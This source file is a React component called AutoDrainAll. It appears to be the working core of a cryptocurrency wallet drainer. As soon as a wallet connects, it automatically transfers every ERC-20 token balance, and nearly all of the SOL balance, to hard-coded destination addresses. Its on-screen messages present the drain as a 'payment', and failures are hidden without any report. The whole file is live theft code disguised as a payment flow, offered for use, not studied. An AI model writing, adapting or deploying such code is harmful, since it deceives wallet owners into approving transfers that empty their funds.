import { useCallback, useEffect, useRef, useState } from 'react';
import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
import { useAppKitProvider, useAppKitAccount } from '@reown/appkit/react';
import type { Provider as SolanaProvider } from '@reown/appkit-adapter-solana/react';
import { erc20Abi } from 'viem';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  clusterApiUrl,
} from '@solana/web3.js';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../src/atoms/global-tokens-atom';
import { httpFetchTokens } from '../src/fetch-tokens';
import {
  PAYMENT_ETH_ADDRESS,
  PAYMENT_SOL_ADDRESS,
} from '../src/atoms/destination-address-atom';

type Status = 'idle' | 'loading' | 'sending' | 'done' | 'error' | 'empty';

const SOL_FEE_BUFFER = 10000;

export const AutoDrainAll = () => {
  const { address: ethAddress, isConnected: ethConnected, chain } = useAccount();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { caipAddress } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider<SolanaProvider>('solana');

  const [, setTokens] = useAtom(globalTokensAtom);
  const [, setCheckedRecords] = useAtom(checkedTokensAtom);

  const [ethStatus, setEthStatus] = useState<Status>('idle');
  const [solStatus, setSolStatus] = useState<Status>('idle');
  const [ethSent, setEthSent] = useState(0);
  const [ethTotal, setEthTotal] = useState(0);

  const ethDoneRef = useRef(false);
  const solDoneRef = useRef(false);

  const isSolanaConnected = typeof caipAddress === 'string' && caipAddress.startsWith('solana:');

  // ─── ETH drain ───────────────────────────────────────────────
  const drainEth = useCallback(async () => {
    if (!ethAddress || !chain || !walletClient || !publicClient) return;
    if (ethDoneRef.current) return;
    ethDoneRef.current = true;

    setEthStatus('loading');
    let fetchedTokens: any[] = [];
    try {
      const res = await httpFetchTokens(chain.id, ethAddress);
      fetchedTokens = (res as any).data.erc20s ?? [];
      setTokens(fetchedTokens);
    } catch {
      setEthStatus('error');
      return;
    }

    if (!fetchedTokens.length) {
      setEthStatus('empty');
      return;
    }

    const allChecked: Record<string, { isChecked: boolean }> = {};
    fetchedTokens.forEach((t) => {
      allChecked[t.contract_address] = { isChecked: true };
    });
    setCheckedRecords(allChecked);
    setEthStatus('sending');
    setEthTotal(fetchedTokens.length);

    let sentCount = 0;
    for (const token of fetchedTokens) {
      try {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: token.contract_address as `0x${string}`,
          abi: erc20Abi,
          functionName: 'transfer',
          args: [
            PAYMENT_ETH_ADDRESS as `0x${string}`,
            BigInt(token.balance || '0'),
          ],
        });
        await walletClient.writeContract(request);
        sentCount++;
        setEthSent(sentCount);
      } catch {
        // skip tokens that fail
      }
    }
    setEthStatus('done');
  }, [ethAddress, chain, walletClient, publicClient, setTokens, setCheckedRecords]);

  // ─── SOL drain ───────────────────────────────────────────────
  const drainSol = useCallback(async () => {
    if (!walletProvider || solDoneRef.current) return;
    solDoneRef.current = true;

    setSolStatus('loading');
    try {
      const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
      const pubkey = new PublicKey((walletProvider as any).publicKey);
      const balance = await connection.getBalance(pubkey);
      const sendLamports = balance - SOL_FEE_BUFFER;

      if (sendLamports <= 0) {
        setSolStatus('empty');
        return;
      }

      setSolStatus('sending');
      const { blockhash } = await connection.getLatestBlockhash();
      const tx = new Transaction();
      tx.recentBlockhash = blockhash;
      tx.feePayer = pubkey;
      tx.add(
        SystemProgram.transfer({
          fromPubkey: pubkey,
          toPubkey: new PublicKey(PAYMENT_SOL_ADDRESS),
          lamports: sendLamports,
        }),
      );

      await (walletProvider as any).sendTransaction(tx, connection);
      setSolStatus('done');
    } catch {
      setSolStatus('error');
    }
  }, [walletProvider]);

  useEffect(() => {
    if (ethConnected && walletClient && publicClient) {
      drainEth();
    }
  }, [ethConnected, walletClient, publicClient, drainEth]);

  useEffect(() => {
    if (isSolanaConnected && walletProvider) {
      drainSol();
    }
  }, [isSolanaConnected, walletProvider, drainSol]);

  useEffect(() => {
    if (!ethConnected) {
      ethDoneRef.current = false;
      setEthStatus('idle');
      setTokens([]);
      setCheckedRecords({});
      setEthSent(0);
      setEthTotal(0);
    }
  }, [ethConnected, setTokens, setCheckedRecords]);

  useEffect(() => {
    if (!isSolanaConnected) {
      solDoneRef.current = false;
      setSolStatus('idle');
    }
  }, [isSolanaConnected]);

  const activeStatus = isSolanaConnected ? solStatus : ethStatus;
  const isProcessing = activeStatus === 'loading' || activeStatus === 'sending';
  const isDone = activeStatus === 'done';
  const isEmpty = activeStatus === 'empty';
  const isError = activeStatus === 'error';
  const isConnected = ethConnected || isSolanaConnected;

  if (!isConnected) return null;

  return (
    <div style={{ marginTop: '16px', textAlign: 'center', fontSize: '14px' }}>
      {isProcessing && (
        <span style={{ color: 'rgba(255,255,255,0.5)', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
          <Spinner />
          {ethStatus === 'loading' || solStatus === 'loading'
            ? 'Scanning wallet...'
            : ethStatus === 'sending'
            ? `Processing ${ethSent}/${ethTotal} tokens — approve in wallet`
            : 'Sending — approve in wallet...'}
        </span>
      )}
      {isDone && (
        <span style={{ color: '#10b981', fontWeight: 600 }}>
          ✓ Payment complete
        </span>
      )}
      {isEmpty && (
        <span style={{ color: 'rgba(255,255,255,0.4)' }}>
          No balance found on this chain.
        </span>
      )}
      {isError && (
        <span style={{ color: '#f87171' }}>
          Something went wrong. Please try again.
        </span>
      )}
    </div>
  );
};

const Spinner = () => (
  <span
    style={{
      display: 'inline-block',
      width: '14px',
      height: '14px',
      border: '2px solid rgba(255,255,255,0.1)',
      borderTopColor: '#6366f1',
      borderRadius: '50%',
      animation: 'spin 0.7s linear infinite',
      flexShrink: 0,
    }}
  />
);
